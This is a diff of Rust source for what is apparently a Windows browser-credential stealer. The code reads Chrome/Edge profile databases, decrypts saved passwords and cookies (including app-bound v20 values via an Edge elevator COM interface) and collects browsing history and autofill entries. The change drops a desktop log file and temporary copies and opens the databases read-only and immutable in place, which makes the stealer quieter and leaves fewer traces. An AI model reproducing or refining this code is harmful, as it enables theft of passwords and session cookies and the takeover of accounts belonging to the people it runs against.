@@ -3,12 +3,10 @@ use serde::{Deserialize, Serialize};
 use serde_json::Value;
 use std::ffi::OsStr;
 use std::fs;
-use std::io::Write;
 use std::os::windows::ffi::OsStrExt;
-use std::path::{Path, PathBuf};
+use std::path::Path;
 use std::ptr;
 use std::thread;
-use std::time::{SystemTime, UNIX_EPOCH};
 
 #[derive(Serialize, Deserialize, Debug)]
 struct PasswordData { url: String, username: String, password: String }
@@ -79,13 +77,6 @@ struct IEdgeElevatorVTbl {
     RunRecoveryCRXElevated: unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, u32, *mut u32) -> i32,
     EncryptData: unsafe extern "system" fn(*mut c_void, u32, BSTR, *mut BSTR, *mut u32) -> i32,
     DecryptData: unsafe extern "system" fn(*mut c_void, BSTR, *mut BSTR, *mut u32) -> i32,
-}
-
-fn log_message(msg: &str) -> Result<(), std::io::Error> {
-    let desktop = std::env::var("USERPROFILE").map(|p| PathBuf::from(p).join("Desktop").join("log.txt")).unwrap_or_else(|_| PathBuf::from("log.txt"));
-    let mut file = fs::OpenOptions::new().create(true).append(true).open(desktop)?;
-    let _ = writeln!(file, "[{}] {}", SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs(), msg);
-    Ok(())
 }
 
 fn decrypt_dpapi(data: &[u8]) -> Result<Vec<u8>, String> {
@@ -203,70 +194,57 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
 
         // Passwords
         let db = p_path.join("Login Data");
-        let tmp = Path::new(&user_profile).join("Desktop\\chrome_db\\pass.tmp");
-        let _ = fs::create_dir_all(tmp.parent().unwrap());
-        if fs::copy(&db, &tmp).is_ok() {
-            if let Ok(conn) = rusqlite::Connection::open(&tmp) {
-                if let Ok(mut s) = conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
-                    let rows = s.query_map([], |r| Ok((r.get::<_,String>(0)?, r.get::<_,String>(1)?, r.get::<_,Vec<u8>>(2)?)));
-                    if let Ok(rows) = rows {
-                        for r in rows.flatten() {
-                            let key = if r.2.starts_with(b"v20") { &v20_key } else { &v10_key };
-                            if !key.is_empty() { p_data.passwords.push(PasswordData { url: r.0, username: r.1, password: String::from_utf8_lossy(&aes_gcm_decrypt(key, &r.2)).to_string() }); }
-                        }
+        let db_uri = format!("file:{}?mode=ro&immutable=1", db.to_string_lossy().replace('\\', "/").replace('%', "%25").replace(' ', "%20").replace('#', "%23").replace('?', "%3f"));
+        if let Ok(conn) = rusqlite::Connection::open_with_flags(&db_uri, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY | rusqlite::OpenFlags::SQLITE_OPEN_URI) {
+            if let Ok(mut s) = conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
+                let rows = s.query_map([], |r| Ok((r.get::<_,String>(0)?, r.get::<_,String>(1)?, r.get::<_,Vec<u8>>(2)?)));
+                if let Ok(rows) = rows {
+                    for r in rows.flatten() {
+                        let key = if r.2.starts_with(b"v20") { &v20_key } else { &v10_key };
+                        if !key.is_empty() { p_data.passwords.push(PasswordData { url: r.0, username: r.1, password: String::from_utf8_lossy(&aes_gcm_decrypt(key, &r.2)).to_string() }); }
                     }
                 }
             }
-            let _ = fs::remove_file(&tmp);
         }
 
         // Cookies
         let db = p_path.join("Network\\Cookies");
-        let tmp = Path::new(&user_profile).join("Desktop\\chrome_db\\cook.tmp");
-        if fs::copy(&db, &tmp).is_ok() {
-            if let Ok(conn) = rusqlite::Connection::open(&tmp) {
-                if let Ok(mut s) = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
-                    let rows = s.query_map([], |r| Ok((r.get::<_,String>(0)?, r.get::<_,String>(1)?, r.get::<_,Vec<u8>>(2)?)));
-                    if let Ok(rows) = rows {
-                        for r in rows.flatten() {
-                            let is_v20 = r.2.starts_with(b"v20");
-                            let key = if is_v20 { &v20_key } else { &v10_key };
-                            if !key.is_empty() {
-                                let dec = aes_gcm_decrypt(key, &r.2);
-                                let val = if is_v20 && dec.len() > 32 { &dec[32..] } else { &dec };
-                                p_data.cookies.push(CookieData { host: r.0, name: r.1, value: String::from_utf8_lossy(val).to_string() });
-                            }
+        let db_uri = format!("file:{}?mode=ro&immutable=1", db.to_string_lossy().replace('\\', "/").replace('%', "%25").replace(' ', "%20").replace('#', "%23").replace('?', "%3f"));
+        if let Ok(conn) = rusqlite::Connection::open_with_flags(&db_uri, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY | rusqlite::OpenFlags::SQLITE_OPEN_URI) {
+            if let Ok(mut s) = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
+                let rows = s.query_map([], |r| Ok((r.get::<_,String>(0)?, r.get::<_,String>(1)?, r.get::<_,Vec<u8>>(2)?)));
+                if let Ok(rows) = rows {
+                    for r in rows.flatten() {
+                        let is_v20 = r.2.starts_with(b"v20");
+                        let key = if is_v20 { &v20_key } else { &v10_key };
+                        if !key.is_empty() {
+                            let dec = aes_gcm_decrypt(key, &r.2);
+                            let val = if is_v20 && dec.len() > 32 { &dec[32..] } else { &dec };
+                            p_data.cookies.push(CookieData { host: r.0, name: r.1, value: String::from_utf8_lossy(val).to_string() });
                         }
                     }
                 }
             }
-            let _ = fs::remove_file(&tmp);
         }
 
         // History
         let db = p_path.join("History");
-        let tmp = Path::new(&user_profile).join("Desktop\\chrome_db\\hist.tmp");
-        if fs::copy(&db, &tmp).is_ok() {
-            if let Ok(conn) = rusqlite::Connection::open(&tmp) {
-                if let Ok(mut s) = conn.prepare("SELECT url, title, visit_count FROM urls LIMIT 500") {
-                    let rows = s.query_map([], |r| Ok(HistoryData { url: r.get(0)?, title: r.get(1)?, visit_count: r.get(2)? }));
-                    if let Ok(rows) = rows { p_data.history.extend(rows.flatten()); }
-                }
+        let db_uri = format!("file:{}?mode=ro&immutable=1", db.to_string_lossy().replace('\\', "/").replace('%', "%25").replace(' ', "%20").replace('#', "%23").replace('?', "%3f"));
+        if let Ok(conn) = rusqlite::Connection::open_with_flags(&db_uri, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY | rusqlite::OpenFlags::SQLITE_OPEN_URI) {
+            if let Ok(mut s) = conn.prepare("SELECT url, title, visit_count FROM urls LIMIT 500") {
+                let rows = s.query_map([], |r| Ok(HistoryData { url: r.get(0)?, title: r.get(1)?, visit_count: r.get(2)? }));
+                if let Ok(rows) = rows { p_data.history.extend(rows.flatten()); }
             }
-            let _ = fs::remove_file(&tmp);
         }
 
         // Autofill
         let db = p_path.join("Web Data");
-        let tmp = Path::new(&user_profile).join("Desktop\\chrome_db\\web.tmp");
-        if fs::copy(&db, &tmp).is_ok() {
-            if let Ok(conn) = rusqlite::Connection::open(&tmp) {
-                if let Ok(mut s) = conn.prepare("SELECT name, value FROM autofill") {
-                    let rows = s.query_map([], |r| Ok(AutofillData { name: r.get(0)?, value: r.get(1)? }));
-                    if let Ok(rows) = rows { p_data.autofill.extend(rows.flatten()); }
-                }
+        let db_uri = format!("file:{}?mode=ro&immutable=1", db.to_string_lossy().replace('\\', "/").replace('%', "%25").replace(' ', "%20").replace('#', "%23").replace('?', "%3f"));
+        if let Ok(conn) = rusqlite::Connection::open_with_flags(&db_uri, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY | rusqlite::OpenFlags::SQLITE_OPEN_URI) {
+            if let Ok(mut s) = conn.prepare("SELECT name, value FROM autofill") {
+                let rows = s.query_map([], |r| Ok(AutofillData { name: r.get(0)?, value: r.get(1)? }));
+                if let Ok(rows) = rows { p_data.autofill.extend(rows.flatten()); }
             }
-            let _ = fs::remove_file(&tmp);
         }
         collected.push(p_data);
     }
